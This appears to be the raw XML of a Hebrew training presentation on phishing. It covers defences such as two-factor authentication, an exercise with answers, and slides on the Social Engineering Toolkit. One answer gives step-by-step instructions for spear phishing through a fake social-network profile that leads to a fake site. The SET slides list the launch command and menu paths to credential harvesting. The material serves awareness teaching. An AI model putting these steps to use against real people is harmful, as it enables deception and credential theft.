              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Anti-phishing Software</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ישנם כלים ותוכנות המיועדים לזהות ולחסום ניסיונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, כולל הרחבות לדפדפנים שמזהות אתרים מזויפים ומתריעות בפני המשתמשים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. אימות דו-שלבי וחוזר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Two-factor and Multi-factor Authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש באימות דו-שלבי מוסיף שכבת אבטחה נוספת בכך שמחייב את המשתמש לספק קוד חד-פעמי בנוסף לסיסמא. זה מקשה על התוקפים לגשת לחשבונות גם אם יש להם את הסיסמא.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="405876669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E3D48E4-16F0-419D-AA2B-1140DB2339CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5744816" y="642594"/>
            <a:ext cx="5380383" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - שאלות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{56BCFC4E-EA8B-487A-A0F8-58000ED32D34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. בדוק מספר אימיילים וזיהה אילו מהם הם ניסיונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. מה הקריטריונים שבהם השתמשת לזיהוי האימיילים החשודים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. צור פרופיל מזויף ברשת חברתית וראה כיצד ניתן להשתמש במידע הזמין כדי לתכנן התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ממוקדת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מה הם הסיכונים הגדולים ביותר של התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לארגונים וכיצד ניתן למזער אותם?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1728759272"/>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D310384-B2B4-4475-B061-45A8F1E2037B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5555974" y="642594"/>
            <a:ext cx="5569226" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14053665-0A42-4883-ADF4-F6954A1A73EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>כתובת השולח:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בדוק אם כתובת האימייל של השולח נראית לגיטימית. תוקפים רבים משתמשים בכתובות דומות לכתובות רשמיות עם הבדלים קטנים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>כותרת האימייל:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> האם הכותרת נשמעת דחופה או מלחיצה? תוקפים משתמשים בכותרות כמו "חשבון נחסם", "פעולה דחופה נדרשת", "ניסיון כניסה חשוד".</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קישורים ומצרפים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בדוק את הקישורים לפני שאתה לוחץ עליהם על ידי העברת העכבר מעליהם. האם הכתובת נראית חשודה? הימנע מלפתוח מצרפים מאנשים שאתה לא מכיר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>טעויות כתיב ודקדוק:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> האם יש באימייל טעויות כתיב או דקדוק? אימיילים לגיטימיים בדרך כלל נכתבים בצורה מקצועית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בקשות למידע אישי:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> האם האימייל מבקש מידע רגיש כמו סיסמאות, פרטי כרטיס אשראי או פרטים אישיים אחרים? חברות לגיטימיות לא יבקשו מידע כזה באימייל.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1067775122"/>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914C743-463E-42DC-A702-2DDED6879701}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5546034" y="642594"/>
            <a:ext cx="5579165" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7BFDEBA-8442-4296-BA60-8BF3E43BD9AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פרופיל מזויף:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> צור פרופיל עם שם ותמונה מזויפים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איסוף מידע:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התחל לאסוף מידע על אנשים שמעניינים אותך (לדוגמה, חברים, עמיתים לעבודה). עקוב אחרי הפרופילים שלהם, בדוק מה הם מפרסמים, מי החברים שלהם, היכן הם עובדים, וכדומה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>יצירת קשר:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התחיל ליצור קשרים עם האנשים על ידי שליחת בקשות חברות או הודעות פרטיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בניית אמון:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התכתב עם הקורבן, התעניין בנושאים שמעניינים אותו, והתחל לבנות מערכת יחסים ואמון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפה ממוקדת:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לאחר שבנית אמון, שלח הודעה שמכילה קישור זדוני או בקשה למידע רגיש. לדוגמה, תודיע על "בעיה טכנית" שדורשת מהקורבן לעדכן את הפרטים שלו באתר מזויף שיצרת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="322054628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A260BD4-3AB5-4D92-8A1C-1618D6F65C3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5546035" y="235090"/>
            <a:ext cx="5579165" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4CEBE7D-1EA6-4708-A3C6-9B848C58C692}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1371599"/>
            <a:ext cx="10058400" cy="5068957"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>א. גניבת מידע רגיש:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכולות להוביל לגניבת מידע עסקי חשוב, סיסמאות של משתמשים, פרטי לקוחות ועוד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> חינוך והדרכה לעובדים לזיהוי והימנעות מהתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. שימוש בכלים לאיתור דואר זבל ודיווח על מיילים חשודים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ב. נזק כספי:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכולות להוביל להפסדים כספיים משמעותיים כתוצאה מגניבת כסף או השבתה של מערכות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש באימות דו-שלבי על כל החשבונות, פרוטוקולים לאבטחת תשלומים, וניטור עסקאות חשודות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ג. נזק למוניטין:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ארגון שנפל קורבן להתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול לאבד את אמון הלקוחות ולסבול מפגיעה במוניטין.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> פרסום מדיניות אבטחה ברורה, שמירה על קשר עם לקוחות ועדכון במקרים של התקפה, ושיפור מתמיד של אמצעי האבטחה.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> השתלטות על מערכות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוקפים יכולים להשתמש במידע שנגנב כדי להשתלט על מערכות הארגון ולגרום לנזקים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ד. השתלטות על מערכות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוקפים יכולים להשתמש במידע שנגנב כדי להשתלט על מערכות הארגון ולגרום לנזקים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שימוש בתוכנות הגנה, עדכוני אבטחה שוטפים, וניטור תעבורת רשת למניעת כניסות בלתי מורשות.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4227173473"/>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1C0E41-85FB-4255-BE31-568DC9B48CCE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6758608" y="642594"/>
            <a:ext cx="4366591" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלי להתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9108B558-CDF8-40AE-9069-4ABBE37BC266}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SET (Social Engineering Toolkit)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Social Engineering Toolkit (SET) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא אחד הכלים הפופולריים ביותר לביצוע התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. הוא מאפשר יצירת קמפיינים של התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בקלות, וכולל מגוון רחב של אפשרויות להתאמה אישית של התקפות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלבים לשימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ליצירת התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הפעלת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>setoolkit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בחירת סוג ההתקפה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תפריט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יפתח. בחר באופציה 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Social-Engineering Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בחירת סוג ההתקפה הספציפית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: למשל, ניתן לבחור באופציה 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Website Attack Vectors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי ליצור אתר מזויף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בחירת סוג ההתקפה על אתר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ניתן לבחור באופציה כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Credential Harvester Attack Method </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit Browser Exploit Method</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="181586057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1C78C01-DB05-4006-80EB-5D2E634C3A99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4621696" y="642594"/>
            <a:ext cx="6503504" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - כלי להתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>דיוג</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="מציין מיקום תוכן 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B631DA9-9FDB-42DC-B100-7B308F24ECAC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="3182336" cy="2716832"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="תמונה 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F00F8DBF-951C-4532-9D08-8711924D89F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8282913" y="2014194"/>
            <a:ext cx="3219899" cy="2114845"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="תמונה 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F63C8FD2-9A12-470F-AD11-547D2376EFAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8282913" y="4747062"/>
            <a:ext cx="3219899" cy="1792887"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="תמונה 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C05C0C8D-D41F-4872-BA28-52ECA3EBCF7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
